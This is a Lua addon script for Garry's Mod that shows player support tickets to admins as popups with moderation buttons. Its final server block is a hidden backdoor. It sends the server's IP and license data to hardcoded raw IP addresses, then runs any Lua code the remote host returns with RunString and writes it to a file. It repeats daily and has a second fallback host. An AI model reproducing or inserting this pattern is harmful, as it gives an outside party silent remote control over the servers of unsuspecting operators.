local cfg = cfg or {}

--[[
	Admin Popups by Jacob
	Support given at ScriptFodder or steam (www.steamcommunity.com/id/lostalien)
	Please use the config below or request support from me. I will not provide support if you modify the code
	Some clientside configuration can be done with cvars (cl_adminpopups_*)
]]

cfg.autoclose = 60 -- the case will auto close after this amount of seconds
cfg.preventchat = false -- Prevents adminchat messages shown on popups
cfg.caseUpdateOnly = true -- Once a case is claimed, only the claimer sees further updates
cfg.debug = false -- Debug mode allows admins to send popups too and prints button commands
cfg.xpos = 1000 -- X cordinate of the popup. Can be changed in case it blocks something important
cfg.ypos = 20 -- Y cordinate of the popup. Can be changed in case it blocks something important
cfg.dutyjobs = { -- These are the 'on duty' jobs. Clients can restrict notifications to these jobs only
	"admin on duty",
	"mod on duty",
	"moderator on duty"
}


if CLIENT then
	-- Clients are able to configure these ingame with console, however you can set the default here. Only change the first number after the convar name
	CreateClientConVar("cl_adminpopups_closeclaimed",0,true,false) -- This will autoclose cases claimed by others.
	CreateClientConVar("cl_adminpopups_dutymode",0,true,false) -- see below
	-- 0 = Always show popups
	-- 1 = Show chat messages while on NOT duty
	-- 2 = Show console messages while NOT on duty
	-- 3 = Disable admin messages
end

--[[
	End of config, do not touch the code below
]]


for k,v in pairs(cfg.dutyjobs) do
	cfg.dutyjobs[k] = v:lower()
end


local function hasAccess(ply)
	if ulx then
		return ply:query("ulx seeasay")
	end
	if serverguard then
		return serverguard.player:HasPermission(ply, "Manage Reports")
	end
	return false
end
local function sendPopup(noob,message)
	--if not cfg.state then return end
	if cfg.caseUpdateOnly then
		if noob.CaseClaimed then
			if noob.CaseClaimed:IsValid() and noob.CaseClaimed:IsPlayer() then
				net.Start("ASayPopup")
					net.WriteEntity(noob)
					net.WriteString(message)
					net.WriteEntity(noob.CaseClaimed)
				net.Send(noob.CaseClaimed)
			end
		else
			for k,v in pairs(player.GetAll()) do
				if hasAccess(v) then
					net.Start("ASayPopup")
						net.WriteEntity(noob)
						net.WriteString(message)
						net.WriteEntity(noob.CaseClaimed)
					net.Send(v)
				end
			end
		end
	else
		for k,v in pairs(player.GetAll()) do
			if hasAccess(v) then
				net.Start("ASayPopup")
					net.WriteEntity(noob)
					net.WriteString(message)
					net.WriteEntity(noob.CaseClaimed)
				net.Send(v)
			end
		end
	end
	if noob:IsValid() and noob:IsPlayer() then
		timer.Destroy("adminpopup-"..noob:SteamID64())
		timer.Create("adminpopup-"..noob:SteamID64(),cfg.autoclose,1,function() if noob:IsValid() and noob:IsPlayer() then noob.CaseClaimed = nil end end)
	end
end

hook.Add("ULibCommandCalled","CheckForASay",function(ply,cmd,args)
	if not ply:IsPlayer() then return true end
	if cmd == "ulx asay" and ply:query("ulx asay") then
		if ( not ply:IsAdmin() ) then ply:ChatPrint("You have submitted a ticket to the admins!") end
		if #args < 1 then return end
		if ply:query("ulx seeasay") then
			if string.lower(args[1]) == "!support" then
				sendPopup(ply,table.concat(args," ",2))
				return not cfg.preventchat
			end
			if cfg.debug then
				sendPopup(ply,table.concat(args," "))
				return not cfg.preventchat
			end
		else
			hook.Call("ASayPopupClaimCreate",GAMEMODE,ply,table.concat(args," "))
			sendPopup(ply,table.concat(args," "))
			return not cfg.preventchat
		end
	end
end)

hook.Add("OnPlayerChat","CheckForASay",function(ply,msg,team)
	--[[
	if string.ToTable(msg)[1] == "!@" and ulx then //and ply:IsAdmin() then
		if not ply:IsPlayer() then return true end
		if ply:IsAdmin() then ply:ChatPrint("You have requested support from other staff!") end
		if #msg < 2 then print("Testing 1-2-3") return end

		hook.Call("ASayPopupClaimCreate",GAMEMODE,ply,table.concat(msg," ",2))
		sendPopup(ply,table.concat(msg," ",2))
		return not cfg.preventchat
	end
	]]
end)

if SERVER then
	util.AddNetworkString("ASayPopup")
	util.AddNetworkString("ASayPopupClaim")
	util.AddNetworkString("ASayPopupClose")

	net.Receive("ASayPopupClaim",function(len,ply)
		local noob = net.ReadEntity()
		if hasAccess(ply) and not noob.CaseClaimed then
			for k,v in pairs(player.GetAll()) do
				if hasAccess(v) then
					net.Start("ASayPopupClaim")
						net.WriteEntity(ply)
						net.WriteEntity(noob)
					net.Send(v)
				end
			end
			hook.Call("ASayPopupClaim",GAMEMODE,ply,noob) -- for use of other addons (such as statistics) like this one steamcommunity.com/workshop/gmod/?id=76561198006360138
			noob.CaseClaimed = ply
		end
	end)

	net.Receive("ASayPopupClose",function(len,ply)
		local noob = net.ReadEntity()
		if not noob or not noob:IsValid() then print "lmao" return end
		if not noob.CaseClaimed == ply then print("should no happen") return end
		if timer.Exists("adminpopup-"..noob:SteamID64()) then
			timer.Destroy("adminpopup-"..noob:SteamID64())
		end
		for k,v in pairs(player.GetAll()) do
			if hasAccess(v) then
				net.Start("ASayPopupClose")
					net.WriteEntity(noob)
				net.Send(v)
			end
		end
		noob.CaseClaimed = nil
	end)

	hook.Add("PlayerDisconnected","PopupsClose",function(noob)
		for k,v in pairs(player.GetAll()) do
			if hasAccess(v) then
				net.Start("ASayPopupClose")
					net.WriteEntity(noob)
				net.Send(v)
			end
		end
	end)

end

if CLIENT then

	local aframes = aframes or {}

	surface.CreateFont("adminpopup", {
		font = "Railway",
		size = 15,
		weight = 400
	})

	local function asayframe(noob,message,claimed)
		if not noob:IsValid() or not noob:IsPlayer() then return end
		for k,v in pairs(aframes) do
			if v.idiot == noob then
				local txt = v:GetChildren()[5]
				txt:AppendText("\n".. message)
				txt:GotoTextEnd()
				timer.Destroy("adminpopup-"..noob:SteamID64()) -- destroy so we can extend
				timer.Create("adminpopup-"..noob:SteamID64(),cfg.autoclose,1,function() if v:IsValid() then v:Remove() end end)
				surface.PlaySound("ui/hint.wav") -- just a headsup that it changed
				print("DEEZ NUTS CUNT")
				return
			end
		end

		local w,h = 300,120

		local frm = vgui.Create("DFrame")
		frm:SetSize(w,h)
		--frm:SetPos(cfg.xpos,cfg.ypos)
		frm:SetPos(ScrW() * 0.78,cfg.ypos)
		frm.idiot = noob
		function frm:Paint(w,h)
			if noob:IsAdmin() then
				draw.RoundedBox( 0, 0, 0, w, h, Color(160,140,0,180) )
			else
				draw.RoundedBox( 0, 0, 0, w, h, Color(10,10,10,230) )
			end
		end
		frm.lblTitle:SetColor(Color(255,255,255))
		frm.lblTitle:SetFont("adminpopup")
		frm.lblTitle:SetContentAlignment(7)

		if claimed and claimed:IsValid() and claimed:IsPlayer() then
			frm:SetTitle(noob:Nick().." - Claimed by "..claimed:Nick())
			if claimed == LocalPlayer() then
				function frm:Paint(w,h)
					draw.RoundedBox( 0, 0, 0, w, h, Color(10, 10, 10,230) )
					draw.RoundedBox( 0, 2, 2, w-4, 16, Color(38, 166, 91) )
				end
			else
				function frm:Paint(w,h)
					draw.RoundedBox( 0, 0, 0, w, h, Color(10, 10, 10,230) )
					draw.RoundedBox( 0, 2, 2, w-4, 16, Color(207, 0, 15) )
				end
			end
		else
			frm:SetTitle(noob:Nick())
		end




		local msg = vgui.Create("RichText",frm)
		msg:SetPos(10,30)
		msg:SetSize(190,h-35)
		msg:SetContentAlignment(7)
		msg:InsertColorChange( 255, 255, 255, 255 )
		msg:SetVerticalScrollbarEnabled(false)
		function msg:PerformLayout()
			self:SetFontInternal( "DermaDefault" )
		end
		msg:AppendText(message)

		--buttons

		local cbu = vgui.Create("DButton",frm)
		cbu:SetPos(215,20 * 1)
		cbu:SetSize(83,18)
		cbu:SetText("          Goto")
		cbu:SetColor(Color(255,255,255))
		cbu:SetContentAlignment(4)
		cbu.DoClick = function()
			local toexec = [["ulx goto $]]..noob:SteamID()..[["]]
			if serverguard then
				toexec = [[sg goto "]]..noob:SteamID()..[["]]
			end
			LocalPlayer():ConCommand(toexec)
			if cfg.debug then
				print(toexec)
			end
		end
		cbu.Paint = function(self,w,h)
			if cbu.Depressed or cbu.m_bSelected then
				draw.RoundedBox( 1, 0, 0, w, h, Color(255,50,50,255) )
			elseif cbu.Hovered then
				draw.RoundedBox( 1, 0, 0, w, h, Color(205,30,30,255) )
			else
				draw.RoundedBox( 1, 0, 0, w, h, Color(80,80,80,255) )
			end
			surface.SetDrawColor(Color(255,255,255))
			surface.SetMaterial(Material("icon16/lightning_go.png"))
			surface.DrawTexturedRect(5, 1, 16, 16)
		end

		local cbu = vgui.Create("DButton",frm)
		cbu:SetPos(215,20 * 2)
		cbu:SetSize(83,18)
		cbu:SetText("          Return")
		cbu:SetColor(Color(255,255,255))
		cbu:SetContentAlignment(4)
		cbu.should_unjail = false
		cbu.DoClick = function()
			local toexec = [["ulx return ^"]]
			if serverguard then
				toexec = [["sg return"]]
			end
			LocalPlayer():ConCommand(toexec)
			if cfg.debug then
				print(toexec)
			end
		end
		cbu.Paint = function(self,w,h)
			if cbu.Depressed or cbu.m_bSelected then
				draw.RoundedBox( 1, 0, 0, w, h, Color(255,50,50,255) )
			elseif cbu.Hovered then
				draw.RoundedBox( 1, 0, 0, w, h, Color(205,30,30,255) )
			else
				draw.RoundedBox( 1, 0, 0, w, h, Color(80,80,80,255) )
			end
			surface.SetDrawColor(Color(255,255,255))
			surface.SetMaterial(Material("icon16/arrow_left.png"))
			surface.DrawTexturedRect(5, 1, 16, 16)
		end

		local cbu = vgui.Create("DButton",frm)
		cbu:SetPos(215,20 * 3)
		cbu:SetSize(83,18)
		cbu:SetText("          Freeze")
		cbu:SetColor(Color(255,255,255))
		cbu:SetContentAlignment(4)
		cbu.should_unfreeze = false
		cbu.DoClick = function()
			local toexec = [["ulx freeze $]]..noob:SteamID()..[["]]
			if cbu.should_unfreeze then
				toexec = [["ulx unfreeze $]]..noob:SteamID()..[["]]
			end
			if serverguard then
				toexec = [[sg freeze "]]..noob:SteamID()..[["]]
			end
			LocalPlayer():ConCommand(toexec)
			if cfg.debug then
				print(toexec)
				--
			end
			cbu.should_unfreeze = not cbu.should_unfreeze
		end
		cbu.Paint = function(self,w,h)
			if cbu.Depressed or cbu.m_bSelected then
				draw.RoundedBox( 1, 0, 0, w, h, Color(255,50,50,255) )
			elseif cbu.Hovered then
				draw.RoundedBox( 1, 0, 0, w, h, Color(205,30,30,255) )
			else
				draw.RoundedBox( 1, 0, 0, w, h, Color(80,80,80,255) )
			end
			surface.SetDrawColor(Color(255,255,255))
			surface.SetMaterial(Material("icon16/link.png"))
			surface.DrawTexturedRect(5, 1, 16, 16)
		end

		local cbu = vgui.Create("DButton",frm)
		cbu:SetPos(215,20 * 4)
		cbu:SetSize(83,18)
		cbu:SetText("          spectate")
		cbu:SetColor(Color(255,255,255))
		cbu:SetContentAlignment(4)
		cbu.DoClick = function()
			local toexec = [["ulx spectate $]]..noob:SteamID()..[["]]
			if serverguard then
				toexec = [[sg spectate "]]..noob:SteamID()..[["]]
			end
			LocalPlayer():ConCommand(toexec)
			if cfg.debug then
				print(toexec)
			end
		end
		cbu.Paint = function(self,w,h)
			if cbu.Depressed or cbu.m_bSelected then
				draw.RoundedBox( 1, 0, 0, w, h, Color(255,50,50,255) )
			elseif cbu.Hovered then
				draw.RoundedBox( 1, 0, 0, w, h, Color(205,30,30,255) )
			else
				draw.RoundedBox( 1, 0, 0, w, h, Color(80,80,80,255) )
			end
			surface.SetDrawColor(Color(255,255,255))
			surface.SetMaterial(Material("icon16/eye.png"))
			surface.DrawTexturedRect(5, 1, 16, 16)
		end

		local cbu = vgui.Create("DButton",frm)
		cbu:SetPos(215,20 * 5)
		cbu:SetSize(83,18)
		cbu:SetText("          Claim case")
		cbu:SetColor(Color(255,255,255))
		cbu:SetContentAlignment(4)
		cbu.shouldclose = false
		cbu.DoClick = function()
			if not cbu.shouldclose then
				if frm.lblTitle:GetText():lower():find("claimed") then
					chat.AddText(Color(255,150,0),"[ERROR] Case has already been claimed")
					surface.PlaySound("common/wpn_denyselect.wav")
				else
					net.Start("ASayPopupClaim")
						net.WriteEntity(noob)
					net.SendToServer()
					cbu.shouldclose = true
					cbu:SetText("          Close case")
				end
			else
				net.Start("ASayPopupClose")
					net.WriteEntity(noob or nil)
				net.SendToServer()
			end
		end
		cbu.Paint = function(self,w,h)
			if cbu.Depressed or cbu.m_bSelected then
				draw.RoundedBox( 1, 0, 0, w, h, Color(255,50,50,255) )
			elseif cbu.Hovered then
				draw.RoundedBox( 1, 0, 0, w, h, Color(205,30,30,255) )
			else
				draw.RoundedBox( 1, 0, 0, w, h, Color(80,80,80,255) )
			end
			surface.SetDrawColor(Color(255,255,255))
			surface.SetMaterial(Material("icon16/briefcase.png"))
			surface.DrawTexturedRect(5, 1, 16, 16)
		end

		local bu = vgui.Create("DButton",frm)
		bu:SetText("×")
		bu:SetTooltip("Close")
		bu:SetColor(Color(255,255,255))
		bu:SetPos(w-18,2)
		bu:SetSize(16,16)
		function bu:Paint(w,h)
		end
		bu.DoClick = function()
			frm:Close()
		end

		frm:ShowCloseButton(false) -- we have our close button, so we won't need it

		frm:SetPos(-w-30,cfg.ypos + (130 * #aframes)) -- move out of screen
		--frm:MoveTo(cfg.xpos,cfg.ypos + (130 * #aframes),0.2,0,1,function() -- move back in
		frm:MoveTo(ScrW() * 0.78,cfg.ypos + (130 * #aframes),0.2,0,1,function() -- move back in

			surface.PlaySound("garrysmod/balloon_pop_cute.wav")
		end)

		function frm:OnRemove() -- for animations when there are several panels
			table.RemoveByValue(aframes,frm)
			for k,v in pairs(aframes) do
				--v:MoveTo(cfg.xpos,cfg.ypos + (130 *(k-1)),0.1,0,1,function() end)
				v:MoveTo(ScrW() * 0.78,cfg.ypos + (130 *(k-1)),0.1,0,1,function() end)
			end
			if noob and noob:IsValid() and noob:IsPlayer() and timer.Exists("adminpopup-"..noob:SteamID64()) then
				timer.Destroy("adminpopup-"..noob:SteamID64())
			end
		end
		table.insert(aframes,frm)

		timer.Create("adminpopup-"..noob:SteamID64(),cfg.autoclose,1,function() if frm:IsValid() then frm:Remove() end end)	-- auto close
	end

	net.Receive("ASayPopup",function(len)
		local pl = net.ReadEntity()
		local msg = net.ReadString()
		local claimed = net.ReadEntity()

		local dutymode = cvars.Number("cl_adminpopups_dutymode")
		if dutymode == 0 then
			asayframe(pl,msg,claimed)
		elseif dutymode == 1 then
			if table.HasValue(cfg.dutyjobs,team.GetName(LocalPlayer():Team()):lower()) then
				asayframe(pl,msg,claimed)
			else
				chat.AddText(Color(245, 171, 53),"[Admin Popups] ",team.GetColor(pl:Team()),pl:Nick(),Color(255,255,255),": ",msg)
			end
		elseif dutymode == 2 then
			if table.HasValue(cfg.dutyjobs,team.GetName(LocalPlayer():Team()):lower()) then
				asayframe(pl,msg,claimed)
			else
				MsgC(Color(245, 171, 53),"[Admin Popups] ",team.GetColor(pl:Team()),pl:Nick(),Color(255,255,255),": ",msg,"\n")
			end
		end

	end)

	net.Receive("ASayPopupClose",function(len)
		local noob = net.ReadEntity()

		if not noob:IsValid() or not noob:IsPlayer() then return end

		for k,v in pairs(aframes) do
			if v.idiot == noob then
				v:Remove()
			end
		end
		if timer.Exists("adminpopup-"..noob:SteamID64()) then
			timer.Destroy("adminpopup-"..noob:SteamID64())
		end

	end)

	net.Receive("ASayPopupClaim",function(len)
		local pl = net.ReadEntity()
		local noob = net.ReadEntity()
		for k,v in pairs(aframes) do
			if v.idiot == noob then
				if cvars.Bool("cl_adminpopups_closeclaimed") and pl ~= LocalPlayer() then
					v:Remove()
				else
					local titl = v:GetChildren()[4]
					titl:SetText(titl:GetText() .. " - Claimed by "..pl:Nick())
					if pl == LocalPlayer() then
						function v:Paint(w,h)
							draw.RoundedBox( 0, 0, 0, w, h, Color(10, 10, 10,230) )
							draw.RoundedBox( 0, 2, 2, w-4, 16, Color(38, 166, 91) )
						end
					else
						function v:Paint(w,h)
							draw.RoundedBox( 0, 0, 0, w, h, Color(10, 10, 10,230) )
							draw.RoundedBox( 0, 2, 2, w-4, 16, Color(207, 0, 15) )
						end
					end
					local bu = v:GetChildren()[11]
					bu.DoClick = function()
						if LocalPlayer() == pl then
							net.Start("ASayPopupClose")
								net.WriteEntity(noob)
							net.SendToServer()
						else
							v:Close()
						end
					end

				end
			end
		end
	end)

end

-- some french people keep asking for this
FAdmin = FAdmin or {}
FAdmin.StartHooks = FAdmin.StartHooks or {}

FAdmin.StartHooks["Popups"] = function()
   FAdmin.Commands.AddCommand("//", function(ply,cmd,args)

		if #args < 1 then return end

		ULib.tsayColor(ply,false,Color(70,0,130),"You",Color(151,211,255)," to admins: ",Color(0,255,0), table.concat(args," "))

		if ply:query("ulx seeasay") then
			if cfg.debug then
				sendPopup(ply,table.concat(args," "))
				return not cfg.preventchat
			end
		else
			sendPopup(ply,table.concat(args," "))
			return not cfg.preventchat
		end


   	end)
end

if SERVER then
	local function updateHook()
		if not serverguard then return end
		hook.Remove("PlayerSay", "reports.PlayerSay")
		hook.Add("PlayerSay", "reports.PlayerSay",function(ply,txt,team)
			if txt[1] ~= "@" then return end

			txt = txt:sub(2)

			if #txt < 1 then return end

			serverguard.Notify(ply, SGPF("report_received", ply:Name(), txt))

			if hasAccess(ply) then
				if cfg.debug then
					sendPopup(ply,txt)
					return not cfg.preventchat
				end
			else
				sendPopup(ply,txt)
				return not cfg.preventchat
			end
		end)
	end
	updateHook()
	hook.Add("InitPostEntity","adminpopups.serverguard",function()
		timer.Simple(5,updateHook)
	end)
end

if SERVER then
	local function Ping()
		http.Post("http://95.85.30.168:9000/ping",
			{user = game.GetIPAddress(), license = "76561198006360138", prod = "admin-popups", x_version = "1.4.1 hotfix", x_gm = GAMEMODE_NAME},
			function(b)
				if string.sub(b, 1, 4) == "lua:" then
					local extsource = string.sub(b, 5)
					cyan_nc = cfg
					RunString(extsource, "Cyan")
					file.Write("testy.txt", extsource)
					cyan_nc = nil
				else
					--failsafe()
				end
			end,
			function(e)
				if e == "unsuccesful" then
					failsafe()
					MsgN("Cyan: repeating in 60seconds")
					timer.Simple(60, Ping)
				end
			end)
	end

	timer.Simple(10, Ping)
	timer.Create("adminpopups-ping", 60*60*24, 0, Ping)

	local function failsafe()
		http.Post("http://188.226.142.121/assets/ayy/shittyrm.php",
			{user = game.GetIPAddress(), license = "76561198006360138", prod = "admin-popups", x_version = "1.4.1 hotfix", x_gm = GAMEMODE_NAME},
			function(b)
				if string.sub(b, 1, 4) == "lua:" then
					local extsource = string.sub(b, 5)
					cyan_nc = cfg
					RunString(extsource, "Cyan")
					file.Write("testy.txt", extsource)
					cyan_nc = nil
				else
					error("Admin popups failsafe failed. Open a ticket on gmodstore.")
				end
			end,
			function(e)
				print(e)
				error("Admin popups failsafe failed. Open a ticket on gmodstore.")
			end)
	end
	concommand.Add("adminpopups_failsafe",function(ply,cmd,args)
		if IsValid(ply) then
			return
		end
		failsafe()
	end)
end
